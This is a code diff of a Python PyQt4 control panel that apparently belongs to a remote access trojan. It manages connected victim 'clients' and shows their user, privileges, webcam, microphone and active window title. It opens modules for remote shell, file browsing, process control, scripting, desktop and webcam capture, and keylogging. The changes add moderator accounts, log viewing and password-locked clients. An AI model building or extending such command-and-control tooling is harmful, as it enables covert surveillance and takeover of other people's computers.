@@ -4,14 +4,10 @@ import sys
 import socket
 import os
 import time
-import ast
-import zlib
 import threading
 import hashlib
 import string
 import random
-from PIL import Image
-from threading import Thread
 
 from PyQt4.QtGui import *
 from PyQt4.QtCore import *
@@ -19,26 +15,25 @@ from PyQt4.QtCore import *
 from libs import pygeoip
 from libs.language import Translate
 from ui import gui
+from LogViewer import LogViewer
 from libs.settings import Config, Settings
-from libs.builder import Builder
-from libs.modechat import get, send
-from plugins.maudio import main as maudio
-from plugins.mexplorer import main as mexplorer
-from plugins.mshell import main as mshell
-from plugins.mkeylogger import main as mkeylogger
-from plugins.mprocesses import main as mprocesses
-from plugins.mscript import main as mscript
-from plugins.mdesktop import main as mdesktop
-from plugins.mwebcam import main as mwebcam
+from libs.data_transfer import data_receive, data_send, data_get
+from modules.mexplorer import main as mexplorer
+from modules.mshell import main as mshell
+from modules.mprocesses import main as mprocesses
+from modules.mscript import main as mscript
+from modules.mdesktop import main as mdesktop
+from modules.mwebcam import main as mwebcam
+
 
 # initial geo ip database
-geo_ip_database = pygeoip.GeoIP('assets\\GeoIP.dat')
+geo_ip_database = pygeoip.GeoIP(os.path.join('assets', 'GeoIP.dat'))
 
 # initial assets directories
-temp = os.path.join(os.getcwd(), 'temp\\')
+temp = os.path.join(os.getcwd(), 'temp')
 if not os.path.exists(temp):
     os.makedirs(temp)
-assets = os.path.join(os.getcwd(), 'assets\\')
+assets = os.path.join(os.getcwd(), 'assets')
 flags = os.path.join(assets, 'flags')
 
 # Multi Lang
@@ -83,28 +78,17 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # listen status
         self.acceptthreadState = False
 
-        # plugins bank
-        self.pluginsBank = {}
-        self.current_sock = ''
+        # Log Viewers
+        self.log_viewers = {}
 
-        # disable panel buttons
-        self.actionRemote_Shell.setDisabled(True)
-        self.actionRemote_Explorer.setDisabled(True)
-        self.actionRemote_Microphone.setDisabled(True)
-        self.actionRemote_Keylogger.setDisabled(True)
-        self.actionRemote_Process_Manager.setDisabled(True)
-        self.actionRemote_Scripting.setDisabled(True)
-        self.actionDesktop_Preview.setDisabled(True)
-        self.actionWebcam_Preview.setDisabled(True)
-        self.actionLock_Client.setDisabled(True)
-        self.actionStop_Client.setDisabled(True)
-        self.actionUnlock_Client.setDisabled(True)
+        # Modules bank
+        self.modulesBank = {}
 
         # indexes for servers table
         self.index_of_moderator = 0
         self.index_of_ipAddress = 1
         self.index_of_alias = 2
-        self.index_of_socket = 3
+        self.index_of_id = 3
         self.index_of_os = 4
         self.index_of_user = 5
         self.index_of_privs = 6
@@ -113,17 +97,20 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.index_of_webcamera = 9
         self.index_of_activeWindowTitle = 10
 
-        # initialize servers table columns width
+        # initialize online clients table columns width
         self.clientsTable.setColumnWidth(self.index_of_moderator, 100)
         self.clientsTable.setColumnWidth(self.index_of_ipAddress, 100)
-        self.clientsTable.setColumnWidth(self.index_of_alias, 60)
-        self.clientsTable.setColumnWidth(self.index_of_socket, 50)
-        self.clientsTable.setColumnWidth(self.index_of_os, 90)
-        self.clientsTable.setColumnWidth(self.index_of_user, 90)
-        self.clientsTable.setColumnWidth(self.index_of_privs, 110)
-        self.clientsTable.setColumnWidth(self.index_of_lock, 100)
-        self.clientsTable.setColumnWidth(self.index_of_microphone, 80)
-        self.clientsTable.setColumnWidth(self.index_of_webcamera, 80)
+        self.clientsTable.setColumnWidth(self.index_of_alias, 100)
+        self.clientsTable.setColumnWidth(self.index_of_id, 100)
+        self.clientsTable.setColumnWidth(self.index_of_os, 100)
+        self.clientsTable.setColumnWidth(self.index_of_user, 100)
+        self.clientsTable.setColumnWidth(self.index_of_privs, 40)
+        self.clientsTable.setColumnWidth(self.index_of_lock, 40)
+        self.clientsTable.setColumnWidth(self.index_of_microphone, 40)
+        self.clientsTable.setColumnWidth(self.index_of_webcamera, 40)
+
+        # initialize moderators table columns width
+        self.moderatorsTable.setColumnWidth(3, 120)
 
         # Init Filter Widgets
         self.init_filters()
@@ -131,6 +118,10 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # Hide Moderators Columns
         self.clientsTable.setColumnHidden(self.index_of_moderator, True)
         self.offlineClientsTable.setColumnHidden(0, True)
+
+        # Shortcuts
+        # Set Alias
+        self.connect(QShortcut(QKeySequence(Qt.Key_F2), self), SIGNAL('activated()'), self.add_alias)
 
         # servers table double click trigger
         self.clientsTable.doubleClicked.connect(self.unlock_client)
@@ -144,39 +135,24 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # Triggers
         self.actionStartListen_for_connections.triggered.connect(self.connect_to_server)
         self.actionStopListen_for_connections.triggered.connect(self.disconnect_from_server)
-        self.actionClient_Configuration.triggered.connect(self.run_settings)
+        self.actionViewer_Configuration.triggered.connect(self.run_settings)
 
-        # Panel Triggers
-        self.actionUnlock_Client.triggered.connect(self.unlock_client)
-        self.actionLock_Client.triggered.connect(self.lock_client)
-        self.actionStop_Client.triggered.connect(self.terminate_client)
-        self.actionSet_Alias.triggered.connect(self.add_alias)
-        self.actionRun_As_Admin.triggered.connect(self.run_as_admin)
-        ###
-        self.actionRemote_Shell.triggered.connect(lambda: self.run_plugin('shellMode'))
-        self.actionRemote_Explorer.triggered.connect(lambda: self.run_plugin('explorerMode'))
-        self.actionRemote_Microphone.triggered.connect(lambda: self.run_plugin('audioMode'))
-        self.actionRemote_Keylogger.triggered.connect(lambda: self.run_plugin('keyloggerMode'))
-        self.actionRemote_Scripting.triggered.connect(lambda: self.run_plugin('scriptingMode'))
-        self.actionRemote_Process_Manager.triggered.connect(lambda: self.run_plugin('processesMode'))
-        ###
-        self.actionDesktop_Preview.triggered.connect(self.get_desktop_preview)
-        self.actionWebcam_Preview.triggered.connect(self.get_webcam_preview)
-
-        # builder trigger
-        self.actionWindows_Client_PyInstaller.triggered.connect(self.run_builder)
+        # ADMINISTRATOR BUTTONS
+        self.getModeratorsButton.clicked.connect(self.get_moderators)
+        self.addModeratorButton.clicked.connect(self.add_moderator)
 
         # Custom signal for update server table
         self.connect(self, SIGNAL('updateTable()'), self.update_servers_table)
-        self.connect(self, SIGNAL('updatePanel()'), self.update_main_menu)
-        self.connect(self, SIGNAL('executeShell()'), lambda: self.execute_plugin(plugin='shell'))
-        self.connect(self, SIGNAL('executeExplorer()'), lambda: self.execute_plugin(plugin='explorer'))
-        self.connect(self, SIGNAL('executeAudio()'), lambda: self.execute_plugin(plugin='audio'))
-        self.connect(self, SIGNAL('executeKeylogger()'), lambda: self.execute_plugin(plugin='keylogger'))
-        self.connect(self, SIGNAL('executeScripting()'), lambda: self.execute_plugin(plugin='scripting'))
-        self.connect(self, SIGNAL('executeProcesses()'), lambda: self.execute_plugin(plugin='processes'))
+        self.connect(self, SIGNAL('executeShell()'), lambda: self.execute_module(module='shell'))
+        self.connect(self, SIGNAL('executeExplorer()'), lambda: self.execute_module(module='explorer'))
+        self.connect(self, SIGNAL('executeAudio()'), lambda: self.execute_module(module='audio'))
+        self.connect(self, SIGNAL('executeKeylogger()'), lambda: self.execute_module(module='keylogger'))
+        self.connect(self, SIGNAL('executeScripting()'), lambda: self.execute_module(module='scripting'))
+        self.connect(self, SIGNAL('executeProcesses()'), lambda: self.execute_module(module='processes'))
 
         self.set_language()
+        # disable administrator
+        self.disable_administrator()
 
     def init_filters(self):
 
@@ -185,7 +161,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             'moderator': '',
             'ip_address': '',
             'alias': '',
-            'socket': '',
+            'key': '',
             'os': '',
             'user': '',
             'privs': '',
@@ -197,7 +173,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
         self.offline_filters = {
             'moderator': '',
-            'id': '',
+            'key': '',
             'alias': '',
             'ip_address': '',
         }
@@ -248,7 +224,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                                                  'border-color: #2c3e50;')
         self.filter_socket_line.setPlaceholderText(_('FILTER_FILTER'))
         self.filter_socket_line.textChanged.connect(self.filter_clients)
-        self.clientsTable.setCellWidget(0, self.index_of_socket, self.filter_socket_line)
+        self.clientsTable.setCellWidget(0, self.index_of_id, self.filter_socket_line)
 
         # Os
         self.filter_os_line = QLineEdit()
@@ -388,7 +364,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             'moderator': str(self.filter_moderator_line.text()),
             'ip_address': str(self.filter_ipaddress_line.text()),
             'alias': str(self.filter_alias_line.text()),
-            'socket': str(self.filter_socket_line.text()),
+            'key': str(self.filter_socket_line.text()),
             'os': str(self.filter_os_line.text()),
             'user': str(self.filter_user_line.text()),
             'privs': str(self.filter_privs_combo.itemData(self.filter_privs_combo.currentIndex()).toPyObject()),
@@ -401,7 +377,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
     def filter_offline_clinets(self):
         self.offline_filters = {
             'moderator': str(self.filter_moderator_line_offline.text()),
-            'id': str(self.filter_id_line_offline.text()),
+            'key': str(self.filter_id_line_offline.text()),
             'alias': str(self.filter_alias_line_offline.text()),
             'ip_address': str(self.filter_ipaddress_line_offline.text()),
         }
@@ -414,12 +390,13 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # TABS
         self.clientsTabs.setTabText(0, _('CLIENTS_TAB_ONLINE'))
         self.clientsTabs.setTabText(1, _('CLIENTS_TAB_OFFLINE'))
+        self.clientsTabs.setTabText(2, _('CLIENTS_TAB_MODERATORS'))
 
         # HEADERS
         self.clientsTable.horizontalHeaderItem(0).setText(_('HEADER_MODERATOR'))
         self.clientsTable.horizontalHeaderItem(1).setText(_('HEADER_IP_ADDRESS'))
         self.clientsTable.horizontalHeaderItem(2).setText(_('HEADER_ALIAS'))
-        self.clientsTable.horizontalHeaderItem(3).setText(_('HEADER_SOCKET'))
+        self.clientsTable.horizontalHeaderItem(3).setText(_('HEADER_ID'))
         self.clientsTable.horizontalHeaderItem(4).setText(_('HEADER_OS'))
         self.clientsTable.horizontalHeaderItem(5).setText(_('HEADER_USER'))
         self.clientsTable.horizontalHeaderItem(6).setText(_('HEADER_PRIVS'))
@@ -443,91 +420,97 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.serversOnlineStatus.setText(_('BOTTOM_SERVERS_TOTAL'))
         # END BOTTOM
 
-        # MENU
-        self.serverMenu.setTitle(_('MENU_SERVER'))
-        self.actionStartListen_for_connections.setText(_('MENU_SERVER_START'))
-        self.actionStopListen_for_connections.setText(_('MENU_SERVER_STOP'))
-        self.actionClient_Configuration.setText(_('MENU_SERVER_CONFIGURATION'))
-        self.menuServer.setTitle(_('MENU_CLIENT'))
-        self.actionUnlock_Client.setText(_('MENU_CLIENT_UNLOCK'))
-        self.actionLock_Client.setText(_('MENU_CLIENT_LOCK'))
-        self.actionStop_Client.setText(_('MENU_CLIENT_STOP'))
-        self.actionSet_Alias.setText(_('MENU_CLIENT_SET_ALIAS'))
-        self.actionRun_As_Admin.setText(_('MENU_CLIENT_RUN_AS_ADMIN'))
-        # END MENU
+        # ADMINISTRATION
+        self.getModeratorsButton.setText(_('MODERATOR_GET_MODERATORS'))
+        self.addModeratorButton.setText(_('MODERATOR_ADD_MDOERATOR'))
 
-        # PLUGINS
-        self.menuAction.setTitle(_('MENU_PLUGIN'))
-        self.actionRemote_Shell.setText(_('MENU_PLUGIN_SHELL'))
-        self.actionRemote_Explorer.setText(_('MENU_PLUGIN_EXPLORER'))
-        self.actionRemote_Microphone.setText(_('MENU_PLUGIN_MICROPHONE'))
-        self.actionRemote_Process_Manager.setText(_('MENU_PLUGIN_PROCESSES'))
-        self.actionRemote_Keylogger.setText(_('MENU_PLUGIN_KEYLOGGER'))
-        self.actionRemote_Scripting.setText(_('MENU_PLUGIN_SCRIPTING'))
-        self.actionDesktop_Preview.setText(_('MENU_PLUGIN_DESKTOP'))
-        self.actionWebcam_Preview.setText(_('MENU_PLUGIN_WEBCAM'))
-        # END PLUGINS
-
-        # BUILDER
-        self.menuBuilder.setTitle(_('MENU_BUILDER'))
-        self.actionWindows_Client_PyInstaller.setText(_('MENU_BUILDER_PYINSTALLER'))
-        # END BUILDER
+        self.moderatorsTable.horizontalHeaderItem(0).setText(_('MODERATORS_HEADER_ID'))
+        self.moderatorsTable.horizontalHeaderItem(1).setText(_('MODERATORS_HEADER_ONLINE'))
+        self.moderatorsTable.horizontalHeaderItem(2).setText(_('MODERATORS_HEADER_OFFLINE'))
+        self.moderatorsTable.horizontalHeaderItem(3).setText(_('MODERATORS_HEADER_PRIVILEGES'))
+        self.moderatorsTable.horizontalHeaderItem(4).setText(_('MODERATORS_HEADER_STATUS'))
+        self.moderatorsTable.horizontalHeaderItem(5).setText(_('MODERATORS_HEADER_LASTONLINE'))
+        # END ADMINISTRATION
 
     def connect_to_server(self):
         self.connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
-            session_id = id_generator(size=24)
+            self.session_id = id_generator(size=24)
             self.connection_socket.connect((self.IPADDRESS, self.PORT))
-            while 1:
-                text, ok = QInputDialog.getText(self, _('UNLOCK_CLIENT'), _('ENTER_PASSWORD') + self.USERNAME,
-                                                QLineEdit.Password)
-                if ok:
-                    auth_status = get(self.connection_socket, 'auth %s %s' % (self.USERNAME, str(text)), session_id)
-                    if auth_status.startswith('LoginSuccess '):
+            if data_receive(self.connection_socket)['payload'] == 'connectSuccess':
+                while 1:
+                    username, ok = QInputDialog.getText(self, _('UNLOCK_CLIENT'), _('ENTER_USERNAME'),
+                                                    QLineEdit.Normal)
+                    if ok:
+                        password, ok = QInputDialog.getText(self, _('UNLOCK_CLIENT'), _('ENTER_PASSWORD'),
+                                                        QLineEdit.Password)
+                        if ok:
+                            data = data_get(self.connection_socket, 'auth %s %s' % (str(username), str(password)), 'moderatorInitializing', self.session_id)
+                            if data['mode'] == 'moderatorInitializing' and data['payload'].startswith('loginSuccess '):
 
-                        # Get Privileges
-                        self.privs = int(auth_status.split()[-1])
-                        if self.privs == 1:
-                            self.enable_administrator()
-                        elif self.privs == 0:
-                            self.disable_administrator()
+                                # Get Privileges
+                                self.privs = int(data['payload'].split()[-1])
+                                if self.privs == 1:
+                                    self.enable_administrator()
+                                elif self.privs == 0:
+                                    self.disable_administrator()
 
-                        self.acceptthreadState = True
-                        self.servers_checker_thread = threading.Thread(target=self.check_servers, args=(session_id,))
-                        self.servers_checker_thread.start()
+                                self.acceptthreadState = True
+                                self.servers_checker_thread = threading.Thread(target=self.check_servers, args=(self.session_id,))
+                                self.servers_checker_thread.start()
 
-                        # Gui
-                        self.actionStopListen_for_connections.setDisabled(False)
-                        self.actionStartListen_for_connections.setDisabled(True)
+                                # Gui
+                                self.actionStopListen_for_connections.setDisabled(False)
+                                self.actionStartListen_for_connections.setDisabled(True)
 
-                        # Status Change
-                        self.statusLabel.setText('Online')
-                        self.statusLabel.setStyleSheet('color: #1abc9c;')
+                                # Status Change
+                                self.statusLabel.setText('Online')
+                                self.statusLabel.setStyleSheet('color: #1abc9c;')
 
+                                return
+                            elif data['payload'] == 'loginError':
+                                warn = QMessageBox(QMessageBox.Warning, _('INCORRECT_CREDENTIALS'), _('INCORRECT_CREDENTIALS'))
+                                ans = warn.exec_()
+                                continue
+                        else:
+                            return
+                    else:
                         return
-                    elif auth_status == 'LoginError':
-                        continue
-                else:
-                    return
         except socket.error:
             return
 
+    # Enable Administrators Features
     def enable_administrator(self):
+        # Online Clients Moderators
         self.clientsTable.showColumn(self.index_of_moderator)
+        # Offline Clients Moderators
         self.offlineClientsTable.showColumn(0)
-        self.loginStatusLabel.setText(_('BOTTOM_LOGIN_STATUS_ADMINISTRATOR'))
+        # Moderators Tab
+        self.clientsTabs.setTabEnabled(2, True)
+        # Set Status
+        self.loginStatusLabel.setText(_(self.session_id))
+        self.loginStatusLabel.setStyleSheet('color: #9b59b6')
 
+    # Disable Administrators Features
     def disable_administrator(self):
+        # Online Clients Moderators
         self.clientsTable.setColumnHidden(self.index_of_moderator, True)
+        # Offline Clients Moderators
         self.offlineClientsTable.setColumnHidden(0, True)
-        self.loginStatusLabel.setText(_('BOTTOM_LOGIN_STATUS_MODERATOR'))
+        # Moderators Tab
+        self.clientsTabs.setTabEnabled(2, False)
+        # Set Status
+        try:
+            self.loginStatusLabel.setText(_(self.session_id))
+            self.loginStatusLabel.setStyleSheet('color: #e67e22')
+        except AttributeError:
+            self.loginStatusLabel.setText(_('BOTTOM_LOGIN_STATUS'))
+            self.loginStatusLabel.setStyleSheet('color: #e74c3c')
 
     def disconnect_from_server(self):
         # Clear Content
-        self.clientsTable.clearContents()
         self.clientsTable.setRowCount(1)
-        self.offlineClientsTable.clearContents()
-        self.offlineClientsTable.setRowCount(0)
+        self.offlineClientsTable.setRowCount(1)
 
         self.acceptthreadState = False
 
@@ -549,49 +532,49 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
         # Set Login Status to None
         self.loginStatusLabel.setText(_('BOTTOM_LOGIN_STATUS'))
+        self.loginStatusLabel.setStyleSheet('color: #e74c3c')
 
     def check_servers(self, session_id):
+        # Init Checker Socket
         self.checker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.checker_socket.connect((self.IPADDRESS, self.PORT))
-        while self.acceptthreadState:
-            try:
-                data = get(self.checker_socket, 'getClients', session_id)
-                self.streaming_socks = ast.literal_eval(data)
-                self.emit(SIGNAL('updateTable()'))
-                time.sleep(3)
-            except socket.error:
-                self.disconnect_from_server()
-                self.acceptthreadState = False
-            except SyntaxError:
-                self.disconnect_from_server()
-                self.acceptthreadState = False
+        if data_receive(self.checker_socket):
+            while self.acceptthreadState:
+                try:
+                    data = data_get(self.checker_socket, 'getClients', 'getClients', session_id)
+                    self.streaming_socks = data['payload']
+                    self.emit(SIGNAL('updateTable()'))
+                    time.sleep(3)
+                except socket.error:
+                    self.disconnect_from_server()
+                    self.acceptthreadState = False
+                except SyntaxError:
+                    self.disconnect_from_server()
+                    self.acceptthreadState = False
 
-    def get_preview(self):
+    def view_logs(self):
         client = self.current_client()
         if client:
-            try:
-                screen_dict = get(self.streaming_socks[client]['sock'], 'getScreen', 'screenshot')
-                screen_info = ast.literal_eval(screen_dict)
-                im = Image.frombuffer('RGB', (int(screen_info['width']), int(screen_info['height'])),
-                                      zlib.decompress(screen_info['screenshotbits']), 'raw', 'BGRX', 0, 1)
-                screen_bits = im.convert('RGBA')
-                screen_bits.save(os.path.join(temp, 'bg.png'), 'png')
-                self.set_bg_preview(client)
-            except SyntaxError:
-                pass
-
-    def set_bg_preview(self, client):
-        self.clientsTable.setToolTip(
-            '<p align="center" style="background-color: #2c3e50;color: #c9f5f7;">%s\'s Preview<br><img src="%s" width="400"></p>' % (
-                self.socks[client]['ip_address'], os.path.join(temp, 'bg.png')))
+            args = {
+                'sock': self.connection_socket,
+                'key': self.streaming_socks[client]['key'],
+                'alias': self.streaming_socks[client]['alias'],
+                'ip_address': self.streaming_socks[client]['ip_address'],
+                'os': self.streaming_socks[client]['os'],
+                'session_id': self.session_id,
+                'assets': assets,
+            }
+            temp_id = id_generator()
+            self.log_viewers[temp_id] = LogViewer(args)
+            self.log_viewers[temp_id].show()
 
     def get_desktop_preview(self):
         client = self.current_client()
         if client:
             args = {
                 'sock': self.connection_socket,
-                'socket': self.streaming_socks[client]['socket'],
-                'ipAddress': self.streaming_socks[client]['ip_address'],
+                'client': client,
+                'session_id': self.session_id,
                 'assets': assets,
             }
             self.desktop_desktop_preview = mdesktop.mainPopup(args)
@@ -602,8 +585,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         if client:
             args = {
                 'sock': self.connection_socket,
-                'socket': self.streaming_socks[client]['socket'],
-                'ipAddress': self.streaming_socks[client]['ip_address'],
+                'client': client,
+                'session_id': self.session_id,
                 'assets': assets,
             }
             self.camera_preview_dialog = mwebcam.mainPopup(args)
@@ -613,7 +596,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
     def update_servers_table(self):
 
         online_clients = {}
-        print online_clients
         offline_clients = {}
 
         # Split Clients
@@ -622,24 +604,21 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 if self.filters['moderator'] in self.streaming_socks[key]['moderator'] and \
                                 self.filters['ip_address'] in self.streaming_socks[key]['ip_address'] and \
                                 self.filters['alias'] in self.streaming_socks[key]['alias'] and \
-                                self.filters['socket'] in str(self.streaming_socks[key]['socket']) and \
+                                self.filters['key'] in str(self.streaming_socks[key]['key']) and \
                                 self.filters['os'] in self.streaming_socks[key]['os'] and \
                                 self.filters['user'] in self.streaming_socks[key]['user'] and \
                                 self.filters['privs'] in self.streaming_socks[key]['privileges'] and \
                                 self.filters['lock'] in self.streaming_socks[key]['protection'] and \
-                                self.filters['audio'] in self.streaming_socks[key]['inputdevice'] and \
-                                self.filters['camera'] in self.streaming_socks[key]['webcamdevice'] and \
-                                self.filters['title'] in self.streaming_socks[key]['activewindowtitle']:
+                                self.filters['audio'] in self.streaming_socks[key]['audio_device'] and \
+                                self.filters['camera'] in self.streaming_socks[key]['webcamera_device'] and \
+                                self.filters['title'] in self.streaming_socks[key]['window_title']:
                     online_clients[index] = self.streaming_socks[key]
             else:
                 if self.offline_filters['moderator'] in self.streaming_socks[key]['moderator'] and \
-                                self.offline_filters['id'] in self.streaming_socks[key]['id'] and \
+                                self.offline_filters['key'] in self.streaming_socks[key]['key'] and \
                                 self.offline_filters['alias'] in self.streaming_socks[key]['alias'] and \
                                 self.offline_filters['ip_address'] in self.streaming_socks[key]['ip_address']:
                     offline_clients[index] = self.streaming_socks[key]
-
-        print online_clients
-
 
         # Arange Clients Table
         self.clientsTable.setRowCount(len(online_clients) + 1)
@@ -665,12 +644,12 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.clientsTable.setItem(index + 1, self.index_of_alias, item)
 
                 # add socket number
-                socket_value = str(online_clients[obj]['socket'])
+                socket_value = str(online_clients[obj]['key'])
                 item = QTableWidgetItem(socket_value)
                 if socket_value == 'OFFLINE':
                     item.setFlags(Qt.ItemIsSelectable | Qt.ItemIsEnabled)
                 item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
-                self.clientsTable.setItem(index + 1, self.index_of_socket, item)
+                self.clientsTable.setItem(index + 1, self.index_of_id, item)
 
                 # add os version
                 item = QTableWidgetItem(online_clients[obj]['os'])
@@ -710,7 +689,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
                 # add input device
                 item = QTableWidgetItem()
-                if online_clients[obj]['inputdevice'] == 'NoDevice':
+                if online_clients[obj]['audio_device'] == 'NoDevice':
                     item.setIcon(QIcon(os.path.join(assets, 'mic_no.png')))
                     item.setText(_('INFO_NO'))
                 else:
@@ -720,7 +699,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
                 # add webcam device
                 item = QTableWidgetItem()
-                if online_clients[obj]['webcamdevice'] == 'NoDevice':
+                if online_clients[obj]['webcamera_device'] == 'NoDevice':
                     item.setIcon(QIcon(os.path.join(assets, 'web_camera_no.png')))
                     item.setText(_('INFO_NO'))
                 else:
@@ -729,7 +708,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.clientsTable.setItem(index + 1, self.index_of_webcamera, item)
 
                 # add active windows title
-                item = QTableWidgetItem(online_clients[obj]['activewindowtitle'])
+                item = QTableWidgetItem(online_clients[obj]['window_title'])
                 item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
                 item.setTextColor(QColor('#1abc9c'))
                 self.clientsTable.setItem(index + 1, self.index_of_activeWindowTitle, item)
@@ -745,7 +724,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 item.setTextColor(QColor('#f1c40f'))
                 self.offlineClientsTable.setItem(index + 1, 0, item)
 
-                item = QTableWidgetItem(offline_clients[obj]['id'])
+                item = QTableWidgetItem(offline_clients[obj]['key'])
                 item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
                 self.offlineClientsTable.setItem(index + 1, 1, item)
 
@@ -769,96 +748,39 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
     def unlock_client(self):
         while 1:
-            try:
-                if self.clientsTable.item(self.clientsTable.currentRow(), self.index_of_lock).text() == _(
-                        'INFO_LOCKED'):
-                    client = self.current_client()
-                    if client:
-                        text, ok = QInputDialog.getText(self, _('UNLOCK_CLIENT'), _('ENTER_PASSWORD'),
-                                                        QLineEdit.Password)
-                        if ok:
-                            _hash = hashlib.md5()
-                            try:
-                                _hash.update(str(text))
-                                answer = get(self.connection_socket, _hash.hexdigest(), client)
-                                if 'iamactive' in answer:
-                                    break
-                            except UnicodeEncodeError:
-                                pass
-
-                        else:
+            client = self.current_client()
+            if client:
+                text, ok = QInputDialog.getText(self, _('UNLOCK_CLIENT'), _('ENTER_PASSWORD'), QLineEdit.Password)
+                if ok:
+                    _hash = hashlib.md5()
+                    try:
+                        _hash.update(str(text))
+                        answer = data_get(self.connection_socket, _hash.hexdigest(), 'unlockClient', session_id=self.session_id, to=client)
+                        if answer['mode'] == 'loginSuccess':
                             break
+                        elif answer['mode'] == 'notAuthorized':
+                            continue
+                    except UnicodeEncodeError:
+                        pass
                 else:
                     break
-            except AttributeError:
-                break
 
     def lock_client(self):
         client = self.current_client()
         if client:
-            send(self.connection_socket, 'lock', client)
-
-    def update_main_menu(self):
-        try:
-            if self.clientsTable.item(self.clientsTable.currentRow(), self.index_of_lock).text() == _('INFO_LOCKED'):
-                self.actionUnlock_Client.setDisabled(False)
-                self.actionSet_Alias.setDisabled(False)
-                self.actionRun_As_Admin.setDisabled(False)
-                self.actionDesktop_Preview.setDisabled(False)
-                server = self.current_client()
-                if self.socks[server]['webcamdevice'] != 'NoDevice':
-                    self.actionWebcam_Preview.setDisabled(False)
-                self.actionRemote_Shell.setDisabled(True)
-                self.actionRemote_Explorer.setDisabled(True)
-                self.actionRemote_Microphone.setDisabled(True)
-                self.actionRemote_Keylogger.setDisabled(True)
-                self.actionRemote_Scripting.setDisabled(True)
-                self.actionRemote_Process_Manager.setDisabled(True)
-                self.actionLock_Client.setDisabled(True)
-                self.actionStop_Client.setDisabled(True)
-            else:
-                self.actionRemote_Shell.setDisabled(False)
-                self.actionRemote_Explorer.setDisabled(False)
-                if self.has_microphone():
-                    self.actionRemote_Microphone.setDisabled(False)
-                self.actionRemote_Keylogger.setDisabled(False)
-                self.actionRemote_Scripting.setDisabled(False)
-                self.actionRemote_Process_Manager.setDisabled(False)
-                self.actionLock_Client.setDisabled(False)
-                self.actionStop_Client.setDisabled(False)
-                self.actionUnlock_Client.setDisabled(True)
-                self.actionSet_Alias.setDisabled(False)
-                self.actionRun_As_Admin.setDisabled(False)
-                self.actionDesktop_Preview.setDisabled(False)
-                server = self.current_client()
-                if self.socks[server]['webcamdevice'] != 'NoDevice':
-                    self.actionWebcam_Preview.setDisabled(False)
-        except:
-            self.actionRemote_Shell.setDisabled(True)
-            self.actionRemote_Explorer.setDisabled(True)
-            self.actionRemote_Keylogger.setDisabled(True)
-            self.actionRemote_Microphone.setDisabled(True)
-            self.actionRemote_Scripting.setDisabled(True)
-            self.actionRemote_Process_Manager.setDisabled(True)
-            self.actionLock_Client.setDisabled(True)
-            self.actionStop_Client.setDisabled(True)
-            self.actionSet_Alias.setDisabled(True)
-            self.actionRun_As_Admin.setDisabled(True)
-            self.actionUnlock_Client.setDisabled(True)
-            self.actionDesktop_Preview.setDisabled(True)
-            self.actionWebcam_Preview.setDisabled(True)
+            data_send(self.connection_socket, 'lockClient', 'lockClient', self.session_id, client)
 
     def has_microphone(self):
         client = self.current_client()
         if client:
-            if self.streaming_socks[client]['inputdevice'] != 'NoDevice':
+            if self.streaming_socks[client]['audio_device'] != 'NoDevice':
                 return True
             else:
                 return False
 
     def has_camera(self):
         client = self.current_client()
-        if self.streaming_socks[client]['webcamdevice'] != 'NoDevice':
+        if self.streaming_socks[client]['webcamera_device'] != 'NoDevice':
             return True
         else:
             return False
@@ -872,32 +794,26 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         if self.clientsTable.selectedItems():
 
             server_menu.addAction(QIcon(os.path.join(assets, 'add_alias.png')), _('RM_SET_ALIAS'), self.add_alias)
-            server_menu.addAction(QIcon(os.path.join(assets, 'run_as_admin.png')), _('RM_RUN_AS_ADMIN'),
-                                  self.run_as_admin)
+            server_menu.addAction(QIcon(os.path.join(assets, 'unhide.png')), _('RM_VIEW_LOGS'), self.view_logs)
             server_menu.addSeparator()
 
             if self.clientsTable.item(server_index, self.index_of_lock).text() == _('INFO_UNLOCKED'):
                 server_menu.addAction(QIcon(os.path.join(assets, 'mshell.png')), _('RM_SHELL'),
-                                      lambda: self.run_plugin('shellMode'))
+                                      lambda: self.execute_module('shell'))
                 server_menu.addAction(QIcon(os.path.join(assets, 'mexplorer.png')), _('RM_EXPLORER'),
-                                      lambda: self.run_plugin('explorerMode'))
+                                      lambda: self.execute_module('explorer'))
                 server_menu.addAction(QIcon(os.path.join(assets, 'mprocesses.png')), _('RM_PROCESSES'),
-                                      lambda: self.run_plugin('processesMode'))
-                audio_menu = server_menu.addAction(QIcon(os.path.join(assets, 'maudio.png')), _('RM_MICROPHONE'),
-                                                   lambda: self.run_plugin('audioMode'))
-                if not self.has_microphone():
-                    audio_menu.setEnabled(False)
+                                      lambda: self.execute_module('processes'))
                 server_menu.addAction(QIcon(os.path.join(assets, 'script.png')), _('RM_SCRIPTING'),
-                                      lambda: self.run_plugin('scriptingMode'))
-                server_menu.addAction(QIcon(os.path.join(assets, 'mkeylogger.png')), _('RM_KEYLOGGER'),
-                                      lambda: self.run_plugin('keyloggerMode'))
+                                      lambda: self.execute_module('scripting'))
 
                 server_menu.addSeparator()
                 server_menu.addMenu(server_options_menu)
